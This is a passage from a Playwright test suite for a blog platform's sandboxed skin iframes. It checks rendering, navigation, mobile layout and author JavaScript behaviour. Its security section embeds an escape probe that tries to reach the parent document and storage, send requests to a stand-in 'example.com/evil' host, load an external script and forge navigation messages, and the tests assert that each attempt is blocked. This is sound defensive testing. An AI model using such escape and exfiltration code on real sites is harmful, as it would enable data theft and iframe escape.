  지금 문서가 어떤 상태인가를 한 줄로 — 실패했을 때 읽을 수 있게.
*/

async function describeSandboxFrames(page) {

  return page.evaluate(() =>
    Array.from(document.querySelectorAll("iframe.imory-skin-sandbox-frame"))
      .map((el) => {

        const parent = el.parentElement;

        const rects = el.getClientRects().length;

        return ((parent && parent.id) || "?") +
          (rects > 0 ? "" : "(안 보임)");

      })
      .join(" + ") || "(없음)");

}


async function runSurfaces(browser) {

  console.log("\n[surfaces] GALLERY / BANNER / HIGHLIGHTS 렌더");

  const sandboxPkg = readSandboxPkg();


  /*
    화면 셋을 같은 방식으로 잰다.

    needles  : 프레임 안에 반드시 있어야 하는 글자
    pageType : 프레임이 스스로 밝히는 화면 이름
    canonical: 직접 접속한 주소가 정리된 뒤의 경로(없으면 그대로)
  */

  const SURFACES = [
    {
      label: "GALLERY(Pic)",
      sub: "/category/2",
      pageType: "category",
      needles: ["PIC", "사진 글"]
    },
    {
      label: "BANNER",
      sub: "/category/3",
      pageType: "banner",
      needles: ["LINKS", "첫 배너"]
    },
    {
      label: "HIGHLIGHT",
      sub: "/highlights",
      pageType: "highlights",
      needles: ["밑줄", "첫 번째 글의", "여기 메모가 있다"]
    },
    {
      /*
        하이라이트 카테고리를 메뉴의 일반 주소(/category/4)로 열어도
        같은 화면이 열리고 주소가 정규형으로 정리된다
        (IMORY_HIGHLIGHT2_CATEGORY_AND_SETTINGS.md).
      */
      label: "HIGHLIGHT(카테고리 주소로 진입)",
      sub: "/category/4",
      pageType: "highlights",
      needles: ["밑줄", "첫 번째 글의"],
      canonical: "/highlights"
    }
  ];


  for (const surface of SURFACES) {

    const { ctx, page, pageErrors } =
      await openPublicPath(browser, sandboxPkg, surface.sub);

    const frame =
      await waitForSandboxPage(page, surface.pageType);

    check(`[surfaces] ★ ${surface.label} 이 별도 origin 프레임에서 그려진다`,
      Boolean(frame));

    if (frame) {

      const text =
        await frame.locator("#sandboxFrameRoot").innerText();

      for (const needle of surface.needles) {

        check(`[surfaces] ★ ${surface.label} — 프레임에 "${needle}" 이(가) 그려졌다`,
          text.includes(needle), text.slice(0, 160));

      }

      const visible =
        await countVisibleSandboxFrames(page, "#postList");

      check(`[surfaces] ★ ${surface.label} — 이 화면의 sandbox 프레임이 정확히 1개다`,
        visible === 1, String(visible));

      /*
        ★ SANDBOX-5B — 문서 **전체**로도 하나다. 이 화면이 열리는
        순간 HOME 자리의 프레임은 내려간다(#themeMount 가 비고,
        그 realm 의 타이머·저자 JS 가 함께 끝난다).
      */

      const visibleAll =
        await countVisibleSandboxFrames(page);

      check(`[surfaces] ★ ${surface.label} — 문서 전체로도 sandbox 프레임이 1개다`,
        visibleAll === 1, String(visibleAll));

      check(`[surfaces] ★ ${surface.label} — HOME 자리(#themeMount)에는 프레임이 없다`,
        (await page.locator("#themeMount iframe.imory-skin-sandbox-frame").count()) === 0);

      /*
        HOME 과 같은 SkinPackage 의 디자인 체계인가 — 스킨이 선언한
        sb-page 컨테이너가 있고, 그 CSS(max-width 720px)가 실제로
        먹었는지 계산값으로 본다. 프레임에는 플랫폼 CSS 가 없으므로
        이 값이 나오는 길은 스킨 CSS 하나뿐이다.
      */

      const sbPage =
        await frame.evaluate(() => {
          const el = document.querySelector(".sb-page");
          if (!el) return null;
          const cs = getComputedStyle(el);
          return { maxWidth: cs.maxWidth };
        });

      check(`[surfaces] ★ ${surface.label} — HOME 과 같은 스킨 CSS 가 프레임에 적용됐다`,
        Boolean(sbPage) && sbPage.maxWidth === "720px",
        JSON.stringify(sbPage));

      check(`[surfaces] ★ ${surface.label} — 프레임에 supabase 전역이 없다`,
        (await frame.evaluate(() => typeof window.supabaseClient)) === "undefined");

      /*
        ★ 높이가 콘텐츠를 따라왔는가.

        이 세 화면은 컨테이너(#postList)가 아직 hidden 인 동안
        iframe 이 만들어진다(기존 렌더 순서 — 스크래치 내용을 옮긴
        **뒤에** 화면을 드러낸다). 그 상태에서 프레임이 높이를 0 으로
        보고하고 끝나면 화면이 드러난 뒤에도 납작한 채 남는다.
        그래서 실제로 잰다.
      */

      const box =
        await page.evaluate(() => {
          const el = document.querySelector("#postList iframe.imory-skin-sandbox-frame");
          return el ? Math.round(el.getBoundingClientRect().height) : -1;
        });

      const contentHeight =
        await frame.evaluate(() =>
          Math.round(document.documentElement.scrollHeight));

      check(`[surfaces] ★ ${surface.label} — iframe 높이가 콘텐츠를 따라온다 (납작하지 않다)`,
        box > 40 && Math.abs(box - contentHeight) <= 8,
        `iframe=${box} content=${contentHeight}`);

      /*
        그 화면의 namespace 만 도착했는가 — banner 화면에 글 목록을,
        하이라이트 화면에 배너 목록을 보내지 않는다.
      */

      const ns =
        await frame.evaluate(() => {
          const d = window.__imorySandboxLastReceived || {};
          return {
            pageType: d.pageType,
            homeNull: d.home === null,
            categoryNull: d.category === null,
            postNull: d.post === null,
            bannerNull: d.bannerCategory === null,
            highlightsNull: d.highlights === null,
            aliasSame: d.highlights === d.memos
          };
        });

      const expected = {
        category: { categoryNull: false, bannerNull: true, highlightsNull: true },
        banner: { categoryNull: true, bannerNull: false, highlightsNull: true },
        highlights: { categoryNull: true, bannerNull: true, highlightsNull: false }
      }[surface.pageType];

      check(`[surfaces] ★ ${surface.label} — 그 페이지의 namespace 만 채워 보낸다`,
        ns.pageType === surface.pageType &&
        ns.homeNull === true &&
        ns.postNull === true &&
        ns.categoryNull === expected.categoryNull &&
        ns.bannerNull === expected.bannerNull &&
        ns.highlightsNull === expected.highlightsNull,
        JSON.stringify(ns));

      check(`[surfaces] ${surface.label} — highlights 와 memos 는 같은 객체다`,
        ns.aliasSame === true);

    }

    check(`[surfaces] ★ ${surface.label} — 같은 문서에 스킨이 중복으로 그려지지 않는다`,
      (await page.locator("#postList > .imory-skin-root").count()) === 0);

    if (surface.canonical) {

      await page.waitForURL(
        `**/${HOME_SLUG}${surface.canonical}`, { timeout: 10000 }
      ).catch(() => {});

      check(`[surfaces] ★ ${surface.label} — 주소가 정규형으로 정리된다`,
        new URL(page.url()).pathname === `/${HOME_SLUG}${surface.canonical}`,
        page.url());

    }

    check(`[surfaces] ${surface.label} — 부모 문서에 가로 넘침이 없다`,
      (await page.evaluate(() =>
        document.documentElement.scrollWidth -
        document.documentElement.clientWidth)) <= 0);

    check(`[surfaces] ${surface.label} — 페이지 오류 없음`,
      realPageErrors(pageErrors).length === 0,
      realPageErrors(pageErrors).join(" | "));

    await ctx.close();

  }


  /* --- 새로고침 / 뒤로가기 ------------------------------ */

  {
    const { ctx, page, pageErrors } =
      await openPublicPath(browser, sandboxPkg, "/category/3");

    check("[surfaces] ★ BANNER 직접 접속이 프레임으로 열린다",
      Boolean(await waitForSandboxPage(page, "banner")));

    await page.reload({ waitUntil: "load" });

    check("[surfaces] ★ 새로고침해도 같은 화면이 프레임으로 다시 열린다",
      Boolean(await waitForSandboxPage(page, "banner")));

    await page.goto(
      PARENT_ORIGIN + "/" + HOME_SLUG + "/highlights",
      { waitUntil: "load" }
    );

    check("[surfaces] HIGHLIGHT 로 옮겨 갔다",
      Boolean(await waitForSandboxPage(page, "highlights")));

    await page.goBack({ waitUntil: "load" });

    check("[surfaces] ★ 뒤로가기로 BANNER 프레임이 돌아온다",
      Boolean(await waitForSandboxPage(page, "banner")));

    const visibleBack =
      await countVisibleSandboxFrames(page, "#postList");

    check("[surfaces] ★ 뒤로가기 뒤에도 이 화면의 프레임이 1개다 (쌓이지 않는다)",
      visibleBack === 1, String(visibleBack));

    check("[surfaces] 새로고침/뒤로가기 페이지 오류 없음",
      realPageErrors(pageErrors).length === 0,
      realPageErrors(pageErrors).join(" | "));

    await ctx.close();
  }


  /* --- 모바일 390px ------------------------------------- */

  for (const surface of SURFACES.slice(0, 3)) {

    const { ctx, page, pageErrors } =
      await openPublicPath(browser, sandboxPkg, surface.sub, {
        viewport: { width: 390, height: 780 }
      });

    const frame =
      await waitForSandboxPage(page, surface.pageType);

    check(`[surfaces] ★ 390px — ${surface.label} 이 프레임에서 그려진다`,
      Boolean(frame));

    check(`[surfaces] ★ 390px — ${surface.label} 부모 가로 넘침 0`,
      (await page.evaluate(() =>
        document.documentElement.scrollWidth -
        document.documentElement.clientWidth)) <= 0);

    if (frame) {

      check(`[surfaces] ★ 390px — ${surface.label} 프레임 안 가로 넘침 0`,
        (await frame.evaluate(() =>
          document.documentElement.scrollWidth -
          document.documentElement.clientWidth)) <= 0);

    }

    check(`[surfaces] 390px — ${surface.label} 페이지 오류 없음`,
      realPageErrors(pageErrors).length === 0,
      realPageErrors(pageErrors).join(" | "));

    await ctx.close();

  }


  /* --- native 회귀: renderMode 를 지우면 오늘과 같다 ----- */

  {
    const nativePkg = readSandboxPkg();
    delete nativePkg.renderMode;

    for (const [sub, needle] of [
      ["/category/2", "PIC"],
      ["/category/3", "LINKS"],
      ["/highlights", "밑줄"]
    ]) {

      const { ctx, page, pageErrors } =
        await openPublicPath(browser, nativePkg, sub);

      await page.waitForSelector("#postList .imory-skin-root", { timeout: 20000 });

      check(`[surfaces] ★ native 회귀 — ${sub} 는 같은 문서에 그려진다`,
        (await page.locator("iframe.imory-skin-sandbox-frame").count()) === 0 &&
        (await page.locator("#postList .imory-skin-root").first().innerText())
          .includes(needle));

      check(`[surfaces] native 회귀 — ${sub} 페이지 오류 없음`,
        realPageErrors(pageErrors).length === 0,
        realPageErrors(pageErrors).join(" | "));

      await ctx.close();

    }
  }


  /*
    --- 배너/하이라이트 template 이 없는 sandbox 스킨 -------

    ★ 이 경우는 프레임이 아니다.

    BANNER   : templates.banner 가 없으면 지금까지처럼 legacy 배너
               그리드로 간다(skin/skin-banner.js 의 계약 — HOME html
               을 배너에 재사용하지 않는다).
    HIGHLIGHT: 플랫폼 기본 template 은 부모 문서의 highlight-* CSS
               로 그려진다. 그것을 프레임에 넣으면 글자만 남으므로
               native 로 그린다(skin/skin-highlights.js 주석).
  */

  {
    const thinPkg = readSandboxPkg();
    delete thinPkg.templates.banner;
    delete thinPkg.templates.highlights;

    {
      const { ctx, page, pageErrors } =
        await openPublicPath(browser, thinPkg, "/category/3");

      check("[surfaces] ★ templates.banner 가 없으면 프레임이 아니라 legacy 배너다",
        (await waitForSandboxPage(page, "banner", 3000)) === null);

      check("[surfaces] templates.banner 없음 — 페이지 오류 없음",
        realPageErrors(pageErrors).length === 0,
        realPageErrors(pageErrors).join(" | "));

      await ctx.close();
    }

    {
      const { ctx, page, pageErrors } =
        await openPublicPath(browser, thinPkg, "/highlights");

      await page.waitForSelector("#postList .highlight-screen", { timeout: 20000 });

      check("[surfaces] ★ templates.highlights 가 없으면 플랫폼 기본 template 을 native 로 그린다",
        (await waitForSandboxPage(page, "highlights", 2000)) === null &&
        (await page.locator("#postList .highlight-screen").count()) === 1);

      check("[surfaces] ★ 그때 카드는 그대로 보인다 (데이터가 사라지지 않는다)",
        (await page.locator("#postList .highlight-screen").first().innerText())
          .includes("첫 번째 글의"));

      check("[surfaces] templates.highlights 없음 — 페이지 오류 없음",
        realPageErrors(pageErrors).length === 0,
        realPageErrors(pageErrors).join(" | "));

      await ctx.close();
    }
  }

}


/* =========================================================
   [nav] SANDBOX-2 — 프레임 안 링크가 실제로 눌린다

   여기서 보는 것은 "부모가 화면을 바꿨는가"와 "주소가 따라왔는가"
   둘이다. 프레임은 주소를 보내지 않고 정수 하나만 올리며, 그
   정수를 route 로 바꾸는 표는 부모에만 있다.
========================================================== */

/*
  ★ mock 의 소음 한 가지를 걸러 낸다.

  화면을 빠르게 옮기면 직전 화면이 띄워 둔 supabase 조회가 이동
  도중에 끊긴다. WebKit 은 그 중단을 "due to access control checks"
  라는 CORS 오류로 보고한다(chromium 은 조용히 넘어간다). 실제
  배포에서는 Playwright route 가 없으므로 이 모양이 나지 않는다 —
  판정 대상이 아니라 하네스의 소음이다.

  그 밖의 오류는 전부 그대로 실패로 센다.
*/

function realPageErrors(list) {

  return list.filter(
    (message) =>
      !(message.includes(SUPABASE_HOST) &&
        message.includes("access control checks"))
  );

}




/* =========================================================
   [authorjs] SANDBOX-5A — 저자 JS

   무엇을 보는가
   -------------
   1. 기능   프레임 안에서 **정확히 한 번** 돌고, 클릭/파티클/
             드래그가 실제로 동작하는가
   2. 수명   화면을 오가도 타이머/리스너가 쌓이지 않는가
   3. 관문   전용 opt-in 이 없으면 0회, renderMode 가 native 면 0회
   4. 보안   저자 코드가 부모·네트워크·다른 창에 닿지 못하는가
   5. 오류   JS 가 죽어도 HTML/CSS 는 그대로인가

   ★ 탈출 코드는 fixture 가 아니라 이 파일에 있다.
   하네스가 window.__sandboxHarnessAuthorJsOverride 를 보고 그
   문자열을 skinPackage.js 로 쓴다 — fixture 는 "정상적으로 쓰는
   JS"의 본보기로 두고, 공격 코드는 그것을 기대하는 테스트 옆에
   둔다.
========================================================== */

/* 저자 JS 를 켜는 dev opt-in. sandbox 플래그와 **별개**다. */

const AUTHOR_JS_QUERY =
  ON_QUERY + "&authorJs=1&sandboxSkinJs=1";


/*
  탈출을 시도하는 코드. 결과는 렌더 루트의 data-imory-probe 에
  JSON 으로 남긴다 — 프레임 realm 안에서 읽는다.
*/

const ESCAPE_PROBE = `
(function () {
  var root = document.getElementById("sandboxFrameRoot");
  var out = {};
  var attempt = function (name, fn) {
    try { out[name] = "OK:" + String(fn()); }
    catch (err) { out[name] = "THREW:" + (err && err.name); }
  };

  attempt("parentDocument", function () {
    return window.parent.document.body.childElementCount;
  });
  attempt("parentStorage", function () {
    return window.parent.localStorage.length;
  });
  attempt("topLocation", function () {
    window.top.location = "https://example.com/evil";
    return "assigned";
  });
  attempt("windowOpen", function () {
    return String(window.open("https://example.com/evil"));
  });
  attempt("fetch", function () {
    window.fetch("https://example.com/evil");
    return "called";
  });
  attempt("xhr", function () {
    var x = new XMLHttpRequest();
    x.open("GET", "https://example.com/evil");
    x.send();
    return "sent";
  });
  attempt("websocket", function () {
    return String(new WebSocket("wss://example.com/evil"));
  });
  attempt("eventsource", function () {
    return String(new EventSource("https://example.com/evil"));
  });
  attempt("beacon", function () {
    return String(navigator.sendBeacon("https://example.com/evil", "x"));
  });
  attempt("formSubmit", function () {
    var f = document.createElement("form");
    f.method = "POST";
    f.action = "https://example.com/evil";
    document.body.appendChild(f);
    f.submit();
    return "submitted";
  });
  attempt("externalScript", function () {
    var s = document.createElement("script");
    s.src = "https://example.com/evil.js";
    document.head.appendChild(s);
    return "appended";
  });
  /*
    nonce 를 두 갈래로 잰다.

      globalNonce  : 우리가 계약으로 남기지 않기로 한 전역 이름
      currentNonce : 지금 실행 중인 자기 script 요소의 nonce

    두 번째는 **읽힌다.** nonce 는 허가 표식이지 임의 JS 실행
    이후의 비밀이 아니다 — 아래 check 가 그 사실을 그대로 기록한다.
  */

  attempt("globalNonce", function () {
    return String(window.__imorySandboxNonce);
  });
  attempt("currentNonce", function () {
    var el = document.currentScript;
    if (!el) { return "NO-CURRENT-SCRIPT"; }
    return (el.nonce ? "READABLE" : "EMPTY") +
      "/attr:" + (el.getAttribute("nonce") ? "READABLE" : "EMPTY");
  });
  attempt("unknownMessage", function () {
    window.parent.postMessage(
      { imory: 1, type: "IMORY_EVAL", seq: 1, payload: { code: "x" } }, "*");
    return "posted";
  });
  attempt("adminNavigate", function () {
    return String(window.imorySkin.navigate("/testuser/admin?manage=1"));
  });
  attempt("forgedNavigate", function () {
    window.parent.postMessage(
      { imory: 1, type: "IMORY_NAVIGATE", seq: 9,
        payload: { contract: 1, renderSeq: 1, href: "https://example.com/evil" } },
      "*");
    return "posted";
  });

  root.setAttribute("data-imory-probe", JSON.stringify(out));
}());
`;


async function openAuthorJsHarness(browser, query, override, viewport) {

  const ctx = await browser.newContext({
    viewport: viewport || { width: 900, height: 900 }
  });

  const page = await ctx.newPage();

  if (typeof override === "string") {
    await page.addInitScript(
      (code) => { window.__sandboxHarnessAuthorJsOverride = code; },
      override
    );
  }

  await page.goto(PARENT_ORIGIN + HARNESS_PATH + query, { waitUntil: "load" });

  await page.waitForFunction(
    () => window.__sandboxHarnessResult !== undefined,
    null,
    { timeout: 20000 }
  );

  return { ctx, page };

}


async function readAuthorJsMarks(frame) {

  return frame.evaluate(() => {

    const root = document.getElementById("sandboxFrameRoot");

    if (!root) return null;

    const read = (name) => root.getAttribute("data-imory-authorjs-" + name);

    return {
      runs: read("runs"),
      page: read("page"),
      api: read("api"),
      clicks: read("clicks"),
      frames: read("frames"),
      ticks: read("ticks"),
      drag: read("drag"),
      nav: read("nav"),
      badnav: read("badnav"),
      globalTicks: window.__imoryFixtureTicks || 0,
      hasApi: typeof window.imorySkin === "object" && window.imorySkin !== null,
      apiKeys: window.imorySkin ? Object.keys(window.imorySkin).sort() : [],
      scripts: document.querySelectorAll("script[data-imory-author-js]").length
    };

  });

}


async function runAuthorJs(browser) {

  console.log("\n[authorjs] 저자 JS — 실행 · 수명 · 관문 · 보안");


  /* ===== 1. 기본: 프레임 안에서 정확히 한 번 돈다 ======== */

  {
    const { ctx, page } =
      await openAuthorJsHarness(browser, AUTHOR_JS_QUERY);

    const frame = await waitForSandboxRender(page);

    check("[authorjs] 프레임이 떴다", Boolean(frame));

    if (frame) {

      await frame.waitForFunction(
        () => document.getElementById("sandboxFrameRoot")
          .hasAttribute("data-imory-authorjs-runs"),
        null,
        { timeout: 10000 }
      ).catch(() => {});

      const marks = await readAuthorJsMarks(frame);

      check("[authorjs] ★ 저자 JS 가 프레임 안에서 정확히 한 번 돌았다",
        marks && marks.runs === "1", marks ? String(marks.runs) : "(없음)");

      check("[authorjs] ★ script 요소도 한 개뿐이다",
        marks && marks.scripts === 1, marks ? String(marks.scripts) : "");

      check("[authorjs] ★ API 가 계약대로 왔다 (version 1 · 키 여섯)",
        marks && marks.api === "1" && marks.page === "home" &&
        JSON.stringify(marks.apiKeys) === JSON.stringify(
          ["context", "navigate", "onCleanup", "pageType", "root", "version"]),
        marks ? JSON.stringify(marks.apiKeys) : "");


      /* --- 버튼 클릭으로 패널 열고 닫기 --------------- */

      const panel = frame.locator(".sb-js-panel");

      check("[authorjs] 처음에 패널은 닫혀 있다",
        (await panel.getAttribute("data-open")) === "0");

      await frame.locator(".sb-js-toggle").click();

      check("[authorjs] ★ 버튼을 누르면 패널이 열린다",
        (await panel.getAttribute("data-open")) === "1" &&
        (await panel.isVisible()) === true);

      await frame.locator(".sb-js-toggle").click();

      check("[authorjs] ★ 다시 누르면 닫힌다",
        (await panel.getAttribute("data-open")) === "0" &&
        (await panel.isVisible()) === false);


      /* --- 파티클 (requestAnimationFrame) -------------- */

      await frame.waitForFunction(
        () => Number(document.getElementById("sandboxFrameRoot")
          .getAttribute("data-imory-authorjs-frames") || "0") > 3,
        null,
        { timeout: 8000 }
      ).catch(() => {});

      const afterFrames = await readAuthorJsMarks(frame);

      check("[authorjs] ★ 파티클이 실제로 움직인다 (rAF 가 돈다)",
        Number(afterFrames.frames || "0") > 3, String(afterFrames.frames));

      const dotMoved = await frame.evaluate(() => {
        const dot = document.querySelector(".sb-js-dot");
        return dot ? dot.style.left : "";
      });

      check("[authorjs] ★ 파티클의 좌표가 CSSOM 으로 실제로 쓰였다",
        /%$/.test(dotMoved), dotMoved);


      /* --- 드래그 ------------------------------------- */

      const card = frame.locator(".sb-js-card");

      /*
        ★ 먼저 화면 안으로 끌어온다. 프레임은 스크롤이 없고
        (overflow:hidden + 높이를 부모가 맞춘다) 카드는 문서
        아래쪽에 있어서, 뷰포트 밖 좌표로 mouse 를 움직이면
        이벤트가 카드에 닿지 않는다.
      */

      await card.scrollIntoViewIfNeeded().catch(() => {});

      const box = await card.boundingBox();

      if (box) {

        /*
          ★ frame locator 의 boundingBox 는 이미 메인 프레임(페이지)
          좌표다. iframe 의 위치를 한 번 더 더하면 두 배가 되어
          카드 바깥을 누르게 된다.
        */

        const sx = box.x + box.width / 2;
        const sy = box.y + box.height / 2;

        await page.mouse.move(sx, sy);
        await page.mouse.down();
        await page.mouse.move(sx + 40, sy + 20, { steps: 6 });
        await page.mouse.up();

        const dragged = await readAuthorJsMarks(frame);

        check("[authorjs] ★ 카드를 끌면 따라온다",
          Boolean(dragged.drag) && dragged.drag !== "0,0",
          String(dragged.drag));

      }

      else {
        check("[authorjs] ★ 카드를 끌면 따라온다", false, "카드를 못 찾음");
      }


      /* --- 타이머가 한 벌뿐인가 ------------------------ */

      await page.waitForTimeout(400);

      const ticked = await readAuthorJsMarks(frame);

      check("[authorjs] ★ 타이머가 돈다",
        Number(ticked.ticks || "0") >= 2, String(ticked.ticks));

      check("[authorjs] ★ 그리고 한 벌뿐이다 (전체 tick == 내 tick)",
        Number(ticked.ticks) === Number(ticked.globalTicks),
        ticked.ticks + " / " + ticked.globalTicks);


      /* --- navigate() 는 표에 있는 주소만 --------------- */

      await frame.locator(".sb-js-badnav").click();

      const badnav = await readAuthorJsMarks(frame);

      check("[authorjs] ★ 표에 없는 주소로는 navigate() 가 false 다",
        badnav.badnav === "0", String(badnav.badnav));

    }

    await ctx.close();
  }


  /* ===== 2. 관문: 전용 opt-in 이 없으면 0회 ============== */

  {
    const { ctx, page } =
      await openAuthorJsHarness(browser, ON_QUERY + "&authorJs=1");

    const frame = await waitForSandboxRender(page);

    check("[authorjs] (opt-in 없음) 화면은 그대로 그려진다", Boolean(frame));

    if (frame) {

      await page.waitForTimeout(500);

      const marks = await readAuthorJsMarks(frame);

      check("[authorjs] ★ 저자 JS 전용 opt-in 이 없으면 0회다",
        marks.runs === null && marks.scripts === 0 && marks.hasApi === false,
        JSON.stringify([marks.runs, marks.scripts, marks.hasApi]));

      const drew = await frame.locator(".sb-js-toggle").count();

      check("[authorjs] ★ 그래도 HTML/CSS 는 그대로다 (JS 만 빠진다)",
        drew === 1, String(drew));

    }

    await ctx.close();
  }


  /* ===== 3. 관문: renderMode 가 native 면 프레임 자체가 없다 = */

  {
    const { ctx, page } =
      await openAuthorJsHarness(
        browser,
        AUTHOR_JS_QUERY + "&renderMode=native"
      );

    check("[authorjs] ★ native 스킨은 프레임이 아예 없다 (JS 0회)",
      (await page.locator("iframe").count()) === 0);

    const ranInParent =
      await page.evaluate(() =>
        document.documentElement.outerHTML.indexOf("data-imory-authorjs-runs") !== -1);

    check("[authorjs] ★ 부모 문서에서도 저자 JS 가 돌지 않았다",
      ranInParent === false);

    await ctx.close();
  }


  /* ===== 4. 오류: JS 가 죽어도 화면은 남는다 ============= */

  {
    const { ctx, page } =
      await openAuthorJsHarness(
        browser,
        AUTHOR_JS_QUERY,
        "window.__ranBefore = 1; null.x.y = 1;"
      );

    const frame = await waitForSandboxRender(page);

    check("[authorjs] (runtime error) 화면은 그려졌다", Boolean(frame));

    if (frame) {

      const drew = await frame.locator(".sb-js-toggle").count();

      check("[authorjs] ★ 런타임 오류가 HTML/CSS 렌더를 깨지 않는다",
        drew === 1, String(drew));

      const before = await frame.evaluate(() => window.__ranBefore || 0);

      check("[authorjs] ★ 오류 전까지의 코드는 실행됐다 (감싸지 않았다)",
        before === 1, String(before));

    }

    await ctx.close();
  }

  {
    const { ctx, page } =
      await openAuthorJsHarness(
        browser,
        AUTHOR_JS_QUERY,
        "function ( { syntax error"
      );

    const frame = await waitForSandboxRender(page);

    check("[authorjs] (syntax error) 화면은 그려졌다", Boolean(frame));

    if (frame) {

      const drew = await frame.locator(".sb-js-toggle").count();

      check("[authorjs] ★ 문법 오류도 HTML/CSS 렌더를 깨지 않는다",
        drew === 1, String(drew));

    }

    await ctx.close();
  }


  /* ===== 5. 보안: 탈출 시도 ============================== */

  {
    const { ctx, page } =
      await openAuthorJsHarness(browser, AUTHOR_JS_QUERY, ESCAPE_PROBE);

    const requests = [];
    page.on("request", (req) => requests.push(req.url()));

    let popups = 0;
    page.on("popup", () => { popups += 1; });

    const frame = await waitForSandboxRender(page);

    check("[authorjs] (보안) 프레임이 떴다", Boolean(frame));

    if (frame) {

      await frame.waitForFunction(
        () => document.getElementById("sandboxFrameRoot")
          .hasAttribute("data-imory-probe"),
        null,
        { timeout: 10000 }
      ).catch(() => {});

      const probe =
        await frame.evaluate(() => {
          const raw = document.getElementById("sandboxFrameRoot")
            .getAttribute("data-imory-probe");
          return raw ? JSON.parse(raw) : null;
        });

      check("[authorjs] (보안) 탐침이 돌았다", Boolean(probe));

      if (probe) {

        check("[authorjs] ★ parent.document 접근이 막힌다",
          String(probe.parentDocument).startsWith("THREW:"),
          probe.parentDocument);

        check("[authorjs] ★ parent.localStorage 접근이 막힌다",
          String(probe.parentStorage).startsWith("THREW:"),
          probe.parentStorage);

        check("[authorjs] ★ top.location 변경이 막힌다",
          String(probe.topLocation).startsWith("THREW:"),
          probe.topLocation);

        check("[authorjs] ★ window.open 이 새 창을 열지 못한다",
          probe.windowOpen === "OK:null" ||
          String(probe.windowOpen).startsWith("THREW:"),
          probe.windowOpen);

        /*
          ★ 여기 두 줄이 nonce 에 대한 이 라운드의 **정확한 기록**이다.

          (1) 우리는 계약으로 약속한 적 없는 전역 이름을 남기지
              않는다 — bridge 가 값을 거둬 가고 window 에서 지운다.
              이것은 노출 면 정리이지 은닉이 아니다.

          (2) 이미 실행 중인 저자 JS 는 자기 script 요소의 nonce 를
              **읽을 수 있다.** nonce 는 "이 script 를 실행해도
              된다"는 허가 표식이지, 임의 JS 가 돈 뒤까지 지켜지는
              보안 경계가 아니다. 그래도 문제가 되지 않는 이유는
              경계가 다른 곳(별도 origin · CSP · sandbox 속성 ·
              부모가 쥔 이동 표)에 있고, 그중 무엇도 nonce 가
              비밀이라는 가정에 기대지 않기 때문이다. 저자가 그
              값으로 script 를 하나 더 붙여도 얻는 것이 없다 —
              이미 이 realm 에서 임의 코드를 돌리고 있다.

          (2)를 "막혔다"로 적으면 문서가 거짓이 된다. 측정한
          그대로 남긴다.
        */

        check("[authorjs] nonce 가 window 전역으로 남아 있지 않다 (은닉이 아니라 정리)",
          probe.globalNonce === "OK:undefined", probe.globalNonce);

        check("[authorjs] ★ (기록) 실행 중인 저자 JS 는 자기 script 의 nonce 를 읽는다 " +
          "— nonce 는 허가 표식이지 보안 경계가 아니다",
          String(probe.currentNonce).indexOf("READABLE") !== -1,
          probe.currentNonce);

        check("[authorjs] ★ 관리자 주소로는 navigate() 가 false 다",
          probe.adminNavigate === "OK:false", probe.adminNavigate);

      }


      /* --- 네트워크: 실제로 나간 요청으로 판정한다 ------ */

      await page.waitForTimeout(600);

      const leaked =
        requests.filter((url) => url.indexOf("example.com") !== -1);

      check("[authorjs] ★ fetch/XHR/WebSocket/EventSource/beacon/form/" +
        "외부 script 중 어느 것도 나가지 못했다",
        leaked.length === 0, leaked.join(", "));

      check("[authorjs] ★ 새 창이 열리지 않았다",
        popups === 0, String(popups));

      check("[authorjs] ★ 프레임은 여전히 sandbox origin 의 그 문서다",
        frame.url().startsWith(SANDBOX_ORIGIN), frame.url());

      check("[authorjs] ★ 부모 주소가 그대로다 (남의 사이트로 끌려가지 않았다)",
        new URL(page.url()).origin === PARENT_ORIGIN &&
        page.url().indexOf("example.com") === -1,
        page.url());


      /* --- 위조 메시지가 부모의 표를 우회하지 못한다 ---- */

      const rejected =
        await page.evaluate(() => window.__sandboxHarnessErrors || []);

      check("[authorjs] ★ 위조 NAVIGATE 로 화면이 바뀌지 않았다",
        page.url().indexOf("example.com") === -1,
        JSON.stringify(rejected));

    }

    await ctx.close();
  }


  /* ===== 6. 모바일 390px ================================ */

  {
    const { ctx, page } =
      await openAuthorJsHarness(
        browser, AUTHOR_JS_QUERY, undefined, { width: 390, height: 780 });

    const frame = await waitForSandboxRender(page);

    check("[authorjs] (390px) 프레임이 떴다", Boolean(frame));

    if (frame) {

      const overflow =
        await frame.evaluate(() =>
          document.documentElement.scrollWidth - document.documentElement.clientWidth);

      check("[authorjs] ★ 390px 에서 프레임이 가로로 넘치지 않는다",
        overflow <= 0, String(overflow));

      const parentOverflow =
        await page.evaluate(() =>
          document.documentElement.scrollWidth - document.documentElement.clientWidth);

      check("[authorjs] ★ 390px 에서 부모도 가로로 넘치지 않는다",
        parentOverflow <= 0, String(parentOverflow));

    }

    await ctx.close();
  }

}


/* =========================================================
   [authorjspages] 공개 다섯 화면 · 화면을 오가도 쌓이지 않는가

   하네스가 아니라 **진짜 index.html** 로 공개 경로를 탄다
   (supabase 만 mock — [home]/[nav] 절과 같은 장치).
========================================================== */

async function runAuthorJsPages(browser) {

  console.log("\n[authorjspages] 저자 JS — 공개 다섯 화면 · 이동");

  const pkg =
    JSON.parse(
      fs.readFileSync(
        path.join(ROOT, "skin", "test-skins", "imory-sandbox-authorjs-v1.json"),
        "utf8"
      )
    );


  const screens = [
    ["/", "home"],
    ["/category/1", "category"],
    ["/category/2", "category"],
    ["/post/101", "post"],
    ["/category/3", "banner"],
    ["/highlights", "highlights"]
  ];

  for (const [subPath, pageType] of screens) {

    const { ctx, page } =
      await openPublicPath(browser, pkg, subPath, { authorJs: true });

    const frame = await waitForSandboxPage(page, pageType);

    check(`[authorjspages] ${subPath} 가 프레임에 떴다 (${pageType})`,
      Boolean(frame));

    if (frame) {

      await frame.waitForFunction(
        () => document.getElementById("sandboxFrameRoot")
          .hasAttribute("data-imory-authorjs-runs"),
        null,
        { timeout: 10000 }
      ).catch(() => {});

      const marks = await readAuthorJsMarks(frame);

      check(`[authorjspages] ★ ${pageType} 에서도 저자 JS 가 한 번 돈다`,
        marks && marks.runs === "1" && marks.page === pageType,
        marks ? marks.runs + " / " + marks.page : "(없음)");

    }

    await ctx.close();

  }


  /* --- 화면을 오가도 쌓이지 않는다 ---------------------- */

  {
    const { ctx, page } =
      await openPublicPath(browser, pkg, "/", { authorJs: true });

    let frame = await waitForSandboxPage(page, "home");

    check("[authorjspages] (왕복) HOME 이 떴다", Boolean(frame));

    if (frame) {

